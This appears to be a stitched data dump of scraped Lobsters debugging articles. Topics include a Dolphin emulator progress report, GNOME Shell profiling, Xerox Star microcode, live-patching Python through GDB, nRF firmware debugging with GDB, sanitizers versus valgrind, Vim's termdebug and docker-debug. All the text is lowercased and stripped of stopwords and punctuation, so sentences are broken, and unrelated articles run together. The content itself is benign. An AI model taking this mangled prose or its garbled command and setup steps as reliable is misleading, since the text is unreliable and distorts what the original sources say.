behavior cropped switching qt controller configuration window opened could nt actually bring game window focus meant order test change made control close window first made adjusting control playing game bit inconvenient modified window structuring bit allow user interact move around render window even controller configuration window open addition cubeb audio backend dolphin finally crossplatform solution audio output developed maintained folk firefox cubeb abstract away need dolphin directly interact operating system platformspecific audio system cubeb also see heavy testing use firefox operating system update break cubeb odds fixed upstream user even report bug u thanks firefox work cubeb consistency different operating system make excellent choice default audio backend keeping around audio backends since le control cubeb might still need one day user preference note existing user unaffected change change default new installation dolphin even autoupdate audio backend selection changed monitor nt quite luster several year ago exciting technology nt truly catch long replaced next big earlier year nvidia even discontinued support vision hard figure even dolphin feature nt tested often broken month time waning interest technology nt stop iwubcode implementing support passive stereoscopic display though dolphin already lot infrastructure place output get broken occasionally work already done passive screen want see favorite game work well time try might forgotten passive stereoscopic used polarized interlaced line polarized glass send unique image eye significantly easier support active required expensive feature high refresh rate active shutter glass cut vertical resolution half added interlacing artifact reduced viewing angle stereoscopic display sold passive important u support stereoscopic display fade away nintendo wii first nintendo home console feature usb port game application would take advantage various usb device internet channel received update allowed user use usb keyboard skylander game use usb device player place swap figurine fondly remembered tony hawk ride came usb skateboard actually surprising number usb device many worked dolphin year unknown user even developer since passthrough become bigger part dolphin help user get authentic experience favorite game gamecube controller bluetooth adapter pas ton device use dolphin minimal configuration set plug play main issue passthrough come platform limitation hid support painless since originally merged us relatively simple transfer type controller skylander portal tony hawk ride skateboard behave expected platform device using io ven usb interface situation got bit complicated dolphin implemented since support greatly varied depending operating system user window particular stuck instability problem due dolphin bug issue libusb particularly support isochronous transfer notably used microphone wii lackluster nearly nonexistent back support first merged linux user leoetlino eventually determined libusb support window nt good enough support wii speak usb microphone consistently usb camera usbdk backend provide isochronous transfer support suffered variety crash connection issue transfer bug made using device window gamble thing could wait libusb one backends add better support two year hiatus situation finally changed winusb libusbk backends isochronous transfer support giving u option see bug usbdk could worked around excitement updated new version libusb tried backends greeted problem plagued dolphin year ago leoetlino nt ready give quite yet fact bug consistent backends narrowed thing quite bit first problem actually spotted dolphin somehow linux managed work device found dolphin using wrong buffer size game using usb ven nt cause problem nt know upon fixing nothing really improved nt several day hardcore debugging thing started make sense top dolphin bug found three bug libusb fix particularly important merged upstream improve support similar device across program perhaps even emulator applied fix version libusb dolphin us everything work u right fix piled thing finally started make sense everything came together combining dolphin fix libusb patch libusbk backend isochronous transfer finally working consistently window mean superfans smash hit shape featuring jenny mccarthy finally played window along usb camera game actual game leoetlino also greatly increased stability usb microphone wii speak passthrough fan rockband karaoke revolution guitar hero game supported usb microphone finally enjoy game without risk randomly crashing time update libusb situation update changed instruction setting usb bluetooth passthrough inherent stability issue using usbdk dolphin longer recommend user us usb passthrough highly recommend update latest build dolphin use libusbk passthrough proved stable compatible libusb backend careful testing may change time winusb usbdk downside libusbk support known compatible device crash winusb support device work usb camera usb microphone wii speak passthrough sometimes hang attempting detach device emulator stop usbdk theoretically work device severe issue work okay gamecube controller passthrough wii usb device use bluetooth passthrough usbdk extremely problematic even hang game resulting immediately closing due losing connection bluetooth device game like metroid prime trilogy supported due required eslaunch cause usbdk fail also suffers random crash using usb microphone usb camera wii speak passthrough user macos vinduv helped point version libusb previous using bug breaking gamecube controller passthrough updated newer version restore support another mostly unrelated change performance optimization usb game mostly affect game older io newer ven protocol nt suffer issue problem game opening closing device every frame causing dolphin full scan device quite slow dolphin wait scan complete first time device opened result american idol encore run nearly ten time faster microphone connected also change increase stability libusb claim threadsafe repeatedly found incorrect added additional safeguard help prevent crash using various form passthrough random crash cursed word world emulation crash rarely actually random result rare inconsistent event difficult reproduce star fox assault plagued one random crash year report crash mission attempt reproduce failed time time year rolled knowledge crash slowly built community issue report three year ago finally gave u way consistently reproduce crash investigate properly use completed savefile unlock mission select play fifth mission difficulty go stage normally reach infected apparoid miniboss purposefully die finishing section respawn simply play get miniboss second time able reproduce issue allowed developer get better idea going error message simple debugging could see star fox assault causing emulated gpu try access bound memory memory address outside physical memory gc simply disallowing dolphin read bound memory fix crash nt exactly answer key question exactly game generate bad command command occur console fault bad emulation command sent console nt gamecube wii crash well nt know booto hardware test bug like oblivion little bit cursory research crash began looking game year expertise extracted game executable disc statically analyzed wanting figure game capability generating address dolphin crashing found code executable generated display list thought list command gpu render learned game removing higher bit due game could nt generate address dolphin crashing leading believe dolphin behaving poorly next wanted find bad address actually coming booto used visual studio memory breakpoint feature set tester go myriad rigorous test together went stage five using dolphin interpreter memory breakpoint active carefully monitoring written afflicted address incredibly slow arduous process condition dolphin running second per frame even using savestate ten frame crash individual run would take minute test allowed booto learn game dozen run able even predict bad value going written memory would happen able watch address wait hit booto traced game executable command generated remember said game could nt generate address dolphin crashing well half true examining executable new information hand booto found second place game could generate display list particular version code forgot mask upper bit long hunt come immediate conclusion invalid memory access caused emulator bug game final act done find access nt cause game crash hardware order test booto corrupted simple graphic homebrew feed various bogus base address see hardware acted including one present star fox assault booto determined top bit physical address get discarded gamecube gpu meaning memory address written display list nt necessarily match cpu sent certain case actually behavior observed part gamecube mmio register look address star fox assault sending gpu plainly see range physical memory gamecube ram give address space thus read physical memory fall within nearly way address space gpu actually try read address would result undeterminable issue attempting send gamecube gpu address range able determine address gpu actually us get address gpu really read first thing need translate binary come come interesting part gpu nt store full address gamecube memory gpu nt bother storing top six bit never need access address far range thus address becomes converting new binary back hexadecimal give u happens fall seems actually bug game one went unnoticed due hardware behavior added note broadway wii actually different flipper gc particular case wii memory gpu discard top three bit address gpu actually ca nt say sure wii compatibility mode though address star fox assault start nt end mattering bit nt cleared otherwise nintendo might bit issue thanks hardware test dolphin correctly handle case star fox assault known crash issue longer occur unfortunately unlikely affect game seen unknown pointer issue crop past tiny chance another developer made mistake note aware portion explanation simplified existence memory mirror specialized memory location locked dcache omitted taken account hardware testing last month contributor special thanks contributor incremented dolphin
196,Lobsters,debugging,Debugging,Profiling GNOME Shell,https://feaneron.com/2019/05/31/profiling-gnome-shell/,profiling gnome shell,mutter gnome shell support sysprofbased profiling fantastic piece size negotiation paint pick like published,today mutter gnome shell support sysprofbased profiling christian wrote fantastic piece exposing happened sysprof cycle already look like skip instead let focus contributed integrating muttergnome shell sysprof let start video video sysprof profiling gnome shell action come drawing gtk clutterbased application follow settled cycle drawing cycle size negotiation position screen element allocates size paint draw actual pixel pick find element pointer see video visual representation cycle happening inside gnome shell although bit detailed see frame missed probably happening occurs perhaps important aspect actual metric performing course room improvement sure already solid first step even landing profiling result already provided u various insight potential improvement good development tool like result better choice enjoy like like loading published de may de
197,Lobsters,debugging,Debugging,A Journey Into the Ether: Debugging Star Microcode,https://engblg.livingcomputers.org/index.php/2019/03/29/833/,journey ether debugging star microcode,darkstar main input loop einloop mar e rhe e etherdisp branch eitoolong mdr eidata eread eread ee ee zerobr goto einloop eread e uesize goto ereadend eread e eidata ee goto ercross eread e eidata ee goto ercross eread eread ee ee zerobr goto einloop eread einloop mar e rhe e etherdisp branch eitoolong mdr eidata eread main input loop einloop mar e rhe e etherdisp branch eitoolong mdr eidata eread eread ee ee zerobr goto einloop eread e uesize goto ereadend eread e eidata ee goto ercross eread e eidata ee goto ercross eread github hardware reference microcode reference drop line,back january unleashed latest emulation project darkstar upon world time knew still area needed refinement area rough around edge star ethernet controller fell latter category detailed documentation ethernet controller unearthed emulated version based reading schematic diagnostic microcode listing along bit guesswork needle say really work ethernet controller could transmit packet fine good receiving opted release darkstar despite deficiency networking important part xerox computing legacy still many interesting thing could done emulator without get release door take short break get back debugging turn break exactly short sometimes get distracted shiny project couple week back finally got back working darkstar started investigation receiver end ethernet interface thing going wrong first thing needed come way see actually received star macrocode level lack source interlispd ethernet microcode could see running darkstar debugger seemed picking incoming packet reading word data packet finally shuffling main memory point thing got opaque software case operating system data apparently happy trickiest part finding diagnostic software run star could show raw ethernet data received long search available viewpoint xde interlispd tool finding nothing met need decided write interlispd choice use interlispd mainly due current lack xde compiler also interlispd documentation covered exactly needed accomplish using etherrecords library wrote quick dirty code print content packet coming cricket nothing nil lisp folk say hmm went back watched microcode read packet indeed pulling data upon closer inspection discarding packet first word microcode checking packet destination mac address begin ethernet packet header matched star mac address ascertaining packet question addressed reasonable behavior packet receiving test harness broadcast packet use destination address ff ff ff ff ff ff definition destined machine network finally noticed hey wait word microcode reading destination address ff slapped forehead saw done whoop accidentally used payloaddata field contains actual data packet rather data field contains full packet including ethernet header microcode never seeing ethernet header instead trying interpret packet data header fixed thing looking much much better able configure tcpip interlispd connect unix host thing generally working except rare occasion star would drop single word two byte incoming packet fanfare error case missing word note occasional loss two character directory listing puzzling say least investigation became clear lost word randomly positioned within packet lost beginning end packet due offbyone error something getting reset packet investigation indicated without fail microcode reading word packet via function read next incoming word ethernet controller put central processor x bus surface looked like microcode reading word one random word getting lost time take good close look microcode lack source code interlispd ethernet microcode hunch would pretty similar used pilot since one right mind rewrite microcode unless absolutely snippet pilot microcode fortunately luck would important portion matched interlisp using notably loop main input loop einloop mar e rhe e etherdisp branch eitoolong mdr eidata eread eread ee ee zerobr goto einloop eread e uesize goto ereadend eread e eidata ee goto ercross eread e eidata ee goto ercross eread code starting label einloop helpfully labeled main input loop load memory address register mar address next word ethernet packet stored following line invokes read word write memory via memory data register mdr next instruction decrement word counter register named ee loop back einloop goto einloop word counter underflows packet large microcode handle abandoned important diversion order discus branch work star microcode default microinstruction inia initialnext instruction address field tell processor find next instruction executed microinstructions need ordered sequentially memory fact generally make looking raw dump microcode highly entertaining end every instruction processor look inia field jump address enable conditional jump microinstruction specify one several type branch dispatch cause processor modify inia next instruction ing one bit based condition status present current instruction referred nia next instruction address example aforementioned word counter underflow checked line eread ee ee zerobr goto einloop eread ee register decremented zerobr field specifies branch result operation zero case inia next instruction einloop modified zerobr einloop mar e rhe e etherdisp branch eitoolong branch denoted branch eitoolong assembler macro denotes two possible destination branch dollar sign indicates case branch next sequential instruction executed instruction need special address case branch indicating underflow processor jump eitoolong instead clear mud good loop exit normal condition microcode instruction einloop clause etherdisp cause microcode dispatch multiway jump based two status bit ethernet controller leastsignificant bit status attn bit used indicate ethernet controller something report completed packet hardware error etc bit always zero ethernet controller installed present bit always like conditional branch dispatch modifies inia next instruction oring status bit form final nia instruction following einloop mdr eidata eread important part u right assembler macro set dispatch table starting label eread place address binary note lower two bit address clear allow branch dispatch modified bit case etherdisp specfies special condition bit zero inia instruction unmodified left loop continues case normal packet completion etherdisp indicate attn bit set oring resulting nia binary looked pretty straightforward see obvious way single word could get lost looked way loop could exited get instruction binary dispatch caused etherdisp first left scratching head mentioned earlier second bit masked etherdisp always zero clue instruction jump page cross handler routine course requires another brief brief diversion central processor minutia star central processor contains simple mechanism providing virtual memory via page map map virtual address physical address page word size cp special safeguard place trap memory access might cross page boundary prevent illegal memory access map maintained particular microinstruction load mar via alu operation cause carry low bit ie calculating address cross boundary result memory access following instruction aborted pagecross branch taken allows microcode deal page maprelated activity update access bit cause page fault example resuming aborted memory access whew case code question main input loop einloop mar e rhe e etherdisp branch eitoolong mdr eidata eread eread ee ee zerobr goto einloop eread e uesize goto ereadend eread e eidata ee goto ercross eread e eidata ee goto ercross eread imagine register e ethernet controller microcode get two whole cpu register name e ee contains processor running instruction einloop alu add resulting carry low pagecross branch forced next instruction pagecross branch inia next instruction next instruction attempt store next word ethernet input fifo memory via operation store aborted due page cross caused last instruction last ored inia causing dispatch binary answer much earlier question routine invoked page cross occurs reading ethernet packet code get routine left exercise reader turn instruction triggering bug emulated ethernet controller e eidata ee goto ercross eread note operation invoked reading word ethernet controller second time turn loop remember first time threw result away since mdr operation canceled second read done intent store abandoned word away register e map operation completed issue real hardware two operation return data word rather reading next word input packet fact one clearly spelledout detail ethernet schematic even explains happening one completely entirely missed writing emulation seems pretty clear microinstructions star central processor grouped click three instruction click worth instruction execute atomically interrupted instruction click executes single cycle referred cycle cycle cycle short see cycle notated microcode snippet microcode function behave differently depending cycle fall load next word ethernet fifo executed return last word loaded missed detail result emulation caused invocation pull next word fifo demonstrated nearly work cause single word lost packet read cross page boundary fixed issue darkstar long last ethernet working properly even able connect one machine museum release github updated grab copy let know work interested learning star work microcode level hardware reference microcode reference good starting point drop line
198,Lobsters,debugging,Debugging,Exploring Python Using GDB,https://stripe.com/blog/exploring-python-using-gdb,exploring python using gdb,gdb segfaults capture flag seaside example project getting set git clone http githubcomstripemonospacedjango cd monospacedjango virtualenv nositepackages env cp envbinpython source envbinactivate pip install r requirementstxt python monospacemanagepy syncdb python monospacemanagepy runserver noreload sudo gdb p pgrep f monospacemanagepy symbolfile automatically script gdb behavior catching error b pyevalevalframeex strcmp pystringasstring f fcode coname handleuncaughtexception c generating initial return value disable frame finish patching code python internals shell curl l http patch p pyimportreloadmodule pyimportaddmodule monospaceviews p pyimportreloadmodule pyimportaddmodule monospaceurls p self pydictgetitemstring f flocals self set request pydictgetitemstring f flocals request set getresponse pyobjectgetattrstring self getresponse set args pybuildvalue request p pyobjectcall getresponse args set rax c,people tend narrow view problem solve using gdb many think gdb debugging segfaults useful c c program reality gdb impressively general powerful tool know use debug anything including python ruby dynamic language inspection also used modify program behavior running ran capture flag contest lot people asked u introduction kind lowlevel work gdb great way get started order demonstrate gdb flexibility show step involved practical gdb work put together brief example debugging python gdb imagine building web app django standard cycle building one apps edit code hit error fix restart server refresh browser little tedious would nt cool could hit error fix code request still pending request complete successfully happens seaside framework support exactly using one stripe example project let take look could pull python using gdb pretty cool right though little contrived example demonstrates many helpful technique making effective realworld use gdb walk little detail explain gdb trick go sake brevity show command type elide output generate working ubuntu gdb manipulation still work platform probably wo nt get automatic prettyprinting python type generate hand running p pystringasstring pyobjectrepr obj gdb getting set first let start monospacedjango server noreload django autoreloading nt get way gdbbased reloading also use interpreter ensure le program state optimized away git clone http githubcomstripemonospacedjango cd monospacedjango virtualenv nositepackages env cp envbinpython source envbinactivate env pip install r requirementstxt env python monospacemanagepy syncdb env python monospacemanagepy runserver noreload sudo gdb p pgrep f monospacemanagepy gnu gdb ubuntulinaro copyright c free software foundation inc attaching process reading symbol homeevanmonospacedjangoenvbinpython done gdb symbolfile load new symbol table n reading symbol done version gdb possible automatically script gdb behavior even register code prettyprint c type python come hook prettyprint python type pyobject understand python stack hook loaded automatically package installed ubuntu whatever debugging look see relevant gdb script helper created many dynamic language catching error python interpreter creates pyframeobject every time start executing python stack frame frame object get name function executed stored python object convert c string using pystringasstring stop interpreter begin executing function called handleuncaughtexception obvious way catch would creating gdb breakpoint lot frame allocated process executing python code though rather tediously continue hundred false positive set conditional breakpoint break frame care gdb b pyevalevalframeex strcmp pystringasstring f fcode coname handleuncaughtexception breakpoint file pythoncevalc line gdb c continuing breakpoint condition pretty complex worth noting conditional breakpoints fire often like pyevalevalframeex slow program significantly generating initial return value okay let see actually fix thing next request resubmit form gdb halt app start generating internal server error response investigate let disable breakpoint order keep thing fast really want let app finish generating original return value error response replace correct response find stack frame getresponse evaluated jumped frame frame command use finish command wait currently selected stack frame finish executing return breakpoint pyevalevalframeex f frame file djangocorehandlersbasepy line handleuncaughtexception pythoncevalc file directory gdb disable gdb frame pyevalevalframeex f frame file djangocorehandlersbasepy line getresponse pythoncevalc gdb finish run till exit pyevalevalframeex f frame file djangocorehandlersbasepy line getresponse fastfunction func function remote pythoncevalc value returned httpresponseservererror remote patching code gotten interpreter state want use python internals modify running state application gdb allows make fairly complicated dynamic function invocation use lot use c equivalent python reload function reimport code also reload monospaceurls module pick new code monospaceviews one handy trick use invoke git video curl run shell command within gdb gdb shell curl l http patch patching file monospaceviewspy gdb p pyimportreloadmodule pyimportaddmodule monospaceviews module remote gdb p pyimportreloadmodule pyimportaddmodule monospaceurls module remote patched reloaded code next let generate new response finding self request local variable stack frame fetch call getresponse method gdb p self pydictgetitemstring f flocals self wsgihandler remote gdb set request pydictgetitemstring f flocals request gdb set getresponse pyobjectgetattrstring self getresponse gdb set args pybuildvalue request gdb p pyobjectcall getresponse args httpresponse remote snippet use gdb set command assign value variable alright new response remember stopped program right original getresponse method returned c return value python interpreter python return value replace return value store new return value rax allow execution continue gdb allows refer refer value returned every command evaluate number case want gdb set rax gdb c continuing like magic web request finish successfully gdb powerful precision tool even spend time writing code much higherlevel language extremely useful available need investigate subtle bug complex issue running application
199,Lobsters,debugging,Debugging,Debugging Firmware with GDB,https://interrupt.memfault.com/blog/gdb-for-firmware-1,debugging firmware gdb,actually developing debugging embedded market study generally difficult gnu debugger gdb hardware required development kit software required setup sdk link download sdk nrfjprog link download command line tool segger jlink link download segger jlink software pkg direct link download gnu arm embedded toolchain version serial terminal program coolterm link download coolterm application adding necessary folder path path running example example compilation documentation optimization hardware setup power serial terminal program setup link ok debugging program remote gdb setup jlinkgdbserver device port running gdb connecting gdb remote target gdb command hint help help help help help breakpoint b continue continue c breakpoints condition breakpoint condition mainc line backtrace backtrace step step appuartget list list list info info info info local info variable info file logging closing summary useful resource,choose one significant aspect aware starting career firmware developer would much time spent actually developing instead debugging firmware convinced leave figure taken embeddedeetimes embedded market study survey showcase significance debugging professional life firmware developer let face debugging generally difficult get even difficult firmware application limitation compared mobile web application due factor limited availability resource debugging example bug difficult diagnose using software breakpoints scenario would rely hardware breakpoints usually limited number hardware breakpoints specific architecture make debugging complex bug challenging task timedependency realtimetimecritical application example setting breakpoints interfere timing operation bug timingrelated debugging process may even cause bug disappear challenge setting debugging environment crossplatform development environment variety visual ides integrated debugger available scenario may need automated debugging setup prove challenging task high cost debugging hardware tool gnu debugger gdb gdb developed richard stallman part gnu system one popular debugger many good reason important gdb support vast number architecture including arm mips many firmware developer knowledge expertise gdb potentially transferrable across many project gdb commandline based give high flexibility usability debugging task require level automation became especially true release python api gdb gdb release version gdb support remote debugging crucial embedded system development environment resides architecture different target system eg developing window machine armbased target reason believe extremely helpful firmware developer least get exposure using gdb post walk setting gdb following environment nordic development kit macos machine development environment running example sdk version specifically uart example application running nonble peripheral example uart use nordic softdevice debugging nrf application softdevice get complicated leave later post go demo utilizing useful feature gdb debug example application hardware required list hardware component required following step tutorial development kit macos computer though step transferrable linux window microusb cable connecting development kit computer software required list software package required following step tutorial setup order use gdb embedded system need set downloads place anywhere machine recommend single folder make easier locate later sdk installation sdk straightforward need download sdk tarball nordic website extract link download sdk extract see following directory structure next need install command line tool include nrfjprog tool programming development kit via segger jlink debugger needed case working command line link download command line tool first make sure select appropriate operating system macos case select latest version click download file content folder look like segger jlink segger jlink software needed gdb server interface chipset development kit let go ahead download software link download segger jlink software download macos pkg installer file download simply doubleclick go installation process next software package need install gnu arm embedded toolchain includes compiler gcc debugger gdb arm architecture chipset based direct link download gnu arm embedded toolchain version download package simply extract folder choice serial terminal program choice terminal program use across project program called coolterm like program simplicity support major platform window macos linux link download coolterm need download open package copy application file mac application folder could launch later step adding necessary folder path order access necessary command calling anywhere system need add path system path environment variable open terminal session type following done go ahead add following line bottom file export path folder path export path folder path make sure replace folder appropriate folder name placed package system need add path segger jlink software ran installer would already added necessary binary system done editing saving path file close terminal start new session make sure updated path file get loaded alternatively could execute following command reload bashprofile verify type following command echo path usrlocalbin usrbin bin usrsbin sbin setup part fun part running example actually debug application use gdb need build example flash development kit following step need take example compilation tutorial using uart example included part sdk version example located examplesperipheraluart notice many subfolders folder mostly interested following highlighted folder screenshot build example let make sure right compiler flag debugging necessary include debugging symbol help gdb present useful debugging information user check compiler flag edit makefile located makefile look optimization flag section optimization flag opt uncomment line enable link time optimization opt flto c flag common target cflags opt let modify reflect following change optimization flag opt og uncomment line enable link time optimization opt flto c flag common target cflags opt changed compiler optimization level og optimizes debugging experience according gdb documentation optimization turning optimization flag make compiler attempt improve performance andor code size expense compilation time possibly ability debug program og optimization level choice standard editcompiledebug cycle offering reasonable level optimization maintaining fast compilation good debugging experience better choice producing debuggable code compiler pass collect debug information disabled go ahead build project run following command output look something like hardware setup second step get hardware set run example step accomplish connect development kit computer via microusb usba cable make sure development kit jumper right setting set default nrf nrf power source set vdd power set erase development kit running following command nrfjprog f eraseall final step flash development kit example binary run following command folder nrfjprog f program chiperase development kit flashed uart example running properly verify using serial terminal program serial terminal program setup mentioned earlier using program called coolterm three part get working run coolterm application make sure serial port setting correct listed link hit ok finally connect serial port clicking connect button may see output since program probably started connected reset development board simply run following command terminal nrfjprog f reset go well see following printed terminal window debugging program application running properly let go ahead set debugger remote gdb setup step get working jlinkgdbserver part segger jlink software installed program jlinkgdbserver included gdb server application interface directly development kit chipset open port chose port network allow connection gdb client start jlink gdb server run following command jlinkgdbservercl device swd port device specifies device type case specifies debug interface swd refers serial wire debug alternative jtag relatively recent used arm processor keep mind chipsets may support swd require jtag instead port specifies network port gdb server accessible gdb client output look something like running gdb gdb server running connect gdb client case client armnoneeabigdb program included part gnu arm embedded toolchain downloaded earlier make thing easier run following command output folder binary image compiled example located next want tell gdb output file used program running development kit following command within gdb console gdb file connecting gdb remote target last step connect gdb server gdb target remote gdb server left running another terminal window show something like following gdb command able connect debugger chipset development kit time start fun hint gdb console pressing enterreturn blank line repeat last command called useful gdb command use debugging application help first command aware help command use help followed command learn everything need know usage command could simply type help gdb console see option available example let run help breakpoint command breakpoint breakpoint command used set breakpoint location telling debugger halt application program reach line code use shortcut b instead spelling full name continue continue command used continue execution breakpoint hit simply use shortcut c instead spelling full word breakpoints condition breakpoints useful sometimes want application stop running unless certain condition occurred breakpoint condition command come example program code mainc line check character sent uart see match q q character set breakpoint stop program receive specific character q q example gdb b cr set breakpoint run program normal type character coolterm program send character chipset see application halt character sent across uart backtrace backtrace command used show call stack program current program counter pc simple term show summary program got currently output backtrace look like adding full option show local variable well want make look pretty basic formatting could use following command gdb set print pretty screenshot showing difference output pretty step step command used step execute source code debugging step function path however step function contain debugging information reference code mainc let take look step command behaves hitting breakpoint set notice gdb stepped function appuartget reaching line list list command show source code current program counter pc default show source code surrounding location pc code line example using list hit breakpoint info info command many us name implies used display information specific element example us info info local show information local variable info variable show information type variable local global info file show information file debugged logging one useful feature within gdb ability log output text file make much easier share output gdb others simply save output later reference done follows gdb set logging start logging gdb set logging stop logging default output log filename gdbtxt saved folder execution gdb initiated closing summary hope post served good starting point using gdb refresher already familiar tool gdb powerful tool way many function command could cover single post idea future gdbrelated post include gdb tip trick know facing problem struggle using gdb let u know discussion area useful resource finally leave useful gdb resource referred year
200,Lobsters,debugging,Debugging,Building better software with better tools: sanitizers versus valgrind,https://lemire.me/blog/2019/05/16/building-better-software-with-better-tools-sanitizers-versus-valgrind/,building better software better tool sanitizers versus valgrind,leak sanitize flag gcc clang valgrind application verifier windbg need install compiler better sanitizers may coming visual studio better sanitizers arrived,often write code using permissive programming language like c c tend generate hardtodebug problem crash application thankfully many compiler offer sanitizers discussed post leak sanitize flag gcc clang strongly encourage use sanitizers think modern way write c c many people describe impossibly difficult build good software c c often think oldschool bare metal c c code sort mysterious thing without protection feel compelled run code debugger manually run write code way get tool sanitizers catch undefined behaviour memory leak buffer overflow data race forth sanitizers game changer bring c closer language like java rust bring safety production since probably want use sanitizers production release building testing code help great deal catch potential issue right away competitive solution people often use great tool called valgrind generalpurpose tool check software run window related program like application verifier windbg macos valgrind used supported longer case believe almost always use sanitizers available comparison tool like valgrind sanitizers caveat valgrind need support instruction software using valgrind run pretty much software even source code sanitizers work compiler level need source code thus need debug closed source library sanitizers unhelpful sanitizers catch problem valgrind catch example catch undesirable undefined behaviour code may work right may work use different compiler different processor catch unsafe memory access look safe valgrind sanitizers precise often turn specific sanitizers specific function compiler sanitizers run test sanitizers simply turning flag valgrind slow like debugger often scale working large data set might take really long time people often dismiss execution time easy work toy problem performance essential qualityoflife attribute think run valgrind simulated production setting however compile code sanitizers emulate production setting sure throughput going impacted effect large code sanitizers slower valgrind sanitizers relatively new support sometimes missing example macos apple yet ship compiler detect memory leak need install compiler even compile code debug symbol common sanitizers report error without proper link source code often need fiddle system configuration linux using gnu gcc found necessary use gold linker get good result fuseldgold default link frequently give error try use sanitizers memory sanitizer check read uninitialized input available gnu gcc llvm requires manually replace c standard library possibly recompile software sanitizer enabled including dependency want avoid false positive visual studio sanitizers largely behind llvm better sanitizers may coming visual studio update better sanitizers arrived furthermore freely use possible sanitizers sadly case sanitizers available yet think safe bet competitive cc compiler soon powerful sanitizers
201,Lobsters,debugging,Debugging,Debugging in Vim,https://www.dannyadam.com/blog/2019/05/debugging-in-vim/,debugging vim,released officially released code signed loading plugin loading program setting breakpoints update et commit program execution stepping code program inspection conclusion,vim released may main new feature official support running terminal within vim along came builtin debugger plugin termdebug provides visual interface interacting gdb post walk example session using termdebug let use termdebug step inspect following c program calculates factorial number using ubuntu along version vim installed ubuntu includes relevant feature officially released part vim addition vim working version gdb required debugging ubuntu installed ubuntu repo macos gdb code signed found gdb version earlier problematic tested macos mojave tested debugging window trying debug vim suggest verifying gdb work expected system path andor name gdb modified setting termdebugger variable invoking termdebug plugin loading termdebug plugin loading factorialc source code let load plugin packadd termdebug termdebug tab split three window rearranged editor window right shown topleft window interacting gdb bottomleft window interacting program loaded gdb editor window corresponding source show breakpoints highlight line stepping program window also clickable button top interacting gdb loading program compile code using g flag include debugger information compiled program gcc g factorialc factorial use gdb window load program addition cw command andor mouse click use gdb command jump gdb window following gdb command load program highlighted image follows gdb file factorial alternatively could passed factorial argument calling termdebug earlier setting breakpoints breakpoints set gdb window using ordinary gdb command gdb b factorial gdb b alternatively breakpoints set navigating line code editor window entering break line breakpoints indicated editor window breakpoints removed gdb command navigating relevant line entering delete update et version vim delete used remove breakpoints changed clear commit march program execution run command start program run args alternatively program launched entering run command directly gdb window gdb run args either case args replaced program argument let use value run factorial program run gdb run pause execution first breakpoint alternative way launch program use gdb start command pause execution beginning program launched program using vim command run execution paused first breakpoint corresponding line highlighted stepping code various way step program invoking gdb stepping command directly gdb windowclicking step next finish cont stop eval editor windowissuing vim command step finish continue stop program inspection value variable inspected various way invoking gdb inspection command directly gdb windowhovering mouse variable editor windowthis requires ballooneval compiletime featurethis worked gvim work reliably running vim terminalissuing vim command evaluate expr omitting expr evaluate expression cursor also performed pressing k conclusion passing breakpoints running program termination see program window expected output calculation builtin help page includes thorough documentation help terminaldebug
202,Lobsters,debugging,Debugging,"ZIO adds asynchronous stack traces, full execution traces & fiber ancestry traces",https://www.slideshare.net/jdegoes/error-management-future-vs-zio,zio add asynchronous stack trace full execution trace fiber ancestry trace,user agreement privacy policy privacy policy user agreement,slideshare us cooky improve functionality performance provide relevant advertising continue browsing site agree use cooky website see user agreement privacy policy slideshare us cooky improve functionality performance provide relevant advertising continue browsing site agree use cooky website see privacy policy user agreement detail
203,Lobsters,debugging,Debugging,Professional debugging for IoT with Particle Workbench: going beyond Serial.print(),https://blog.particle.io/2019/05/03/professional-debugging-for-iot-with-particle-workbench-going-beyond-serial-print/,professional debugging iot particle workbench going beyond serialprint,,
204,Lobsters,debugging,Debugging,docker-debug tool that attach to an already run container,https://github.com/zeromake/docker-debug,dockerdebug tool attach already run container,dockerdebug english 简体中文 overview demo quick start mac brew download binary file release page build source default image todo detail reference thank kubectldebug docker核心技术与实现原理 dockerengineapidoc contributor code contributor contribute financial contributor contribute individual organization contribute,dockerdebug english 简体中文 overview dockerdebug troubleshooting running docker container allows run new container running docker debugging purpose new container join pid network user filesystem ipc namespaces target container use arbitrary troubleshooting tool without preinstalling production container image demo quick start install dockerdebug cli mac brew brew tap zeromakedockerdebug brew install dockerdebug download binary file macos curl lo dockerdebug http linux curl lo dockerdebug http chmod x dockerdebug sudo mv dockerdebug usrlocalbin window curl lo dockerdebugexe http download latest binary release page add path try dockerdebug option container command arg flag dockerdebug container command flag dockerdebug help info dockerdebug info build source clone repo go build dockerdebug cmddockerdebug mv dockerdebug usrlocalbin default image dockerdebug us nicolakanetshoot default image run debug container override default image cli flag even better config file dockerdebugconfigtoml version image nicolakanetshoot latest mountdir mntcontainer timeout configdefault default config configdefault version host unix varrundockersock tl false certdir certpassword todo detail find image docker pull image find container name return error customize image run new container container namespaces ipc pid network etc filesystem stdin stay open create run exec new container debug debug container wait debug container exit cleanup reference thank kubectldebug dockerdebug inspiration kubectl debug tool docker核心技术与实现原理 dockerdebug filesystem blog dockerengineapidoc docker engine api document contributor code contributor project exists thanks people contribute contribute financial contributor become financial contributor help u sustain community contribute individual organization support project organization logo show link website contribute
205,Lobsters,debugging,Debugging,A Recipe for Training Neural Networks,http://karpathy.github.io/2019/04/25/recipe/,recipe training neural network,posted webinar neural net training leaky abstraction request yes understand backprop neural net training fails silently fast furious approach training neural network work recipe become one data set endtoend trainingevaluation skeleton get dumb baseline fix random seed simplify add significant digit eval verify loss init init well human baseline inputindepent baseline overfit one batch verify decreasing training loss visualize net visualize prediction dynamic use backprop chart dependency ith generalize special case overfit picking model hero adam safe complexify one time trust learning rate decay default regularize get data data augment creative augmentation domain randomization simulation hybrid pretrain stick supervised learning smaller input dimensionality smaller model size decrease batch size drop seem play nice weight decay early stopping try larger model tune random grid search best use random search instead b hyperparameter optimization squeeze juice ensemble dark knowledge leave training conclusion,week ago posted tweet common neural net mistake listing common gotchas related training neural net tweet got quite bit engagement anticipated including webinar clearly lot people personally encountered large gap convolutional layer work convnet achieves state art result thought could fun brush dusty blog expand tweet long form topic deserves however instead going enumeration common error fleshing wanted dig bit deeper talk one avoid making error altogether fix fast trick follow certain process far tell often documented let start two important observation motivate neural net training leaky abstraction allegedly easy get started training neural net numerous library framework take pride displaying miracle snippet solve data problem giving false impression stuff plug play common see thing like yourdata plug awesome dataset model supercrossvalidator superduperfit yourdata sgdoptimizer conquer world library example activate part brain familiar standard software place clean apis abstraction often attainable request library demonstrate r requestsget http apigithubcomuser auth user pas rstatuscode cool courageous developer taken burden understanding query string url getpost request http connection largely hidden complexity behind line code familiar expect unfortunately neural net nothing like offtheshelf technology second deviate slightly training imagenet classifier tried make point post yes understand backprop picking backpropagation calling leaky abstraction situation 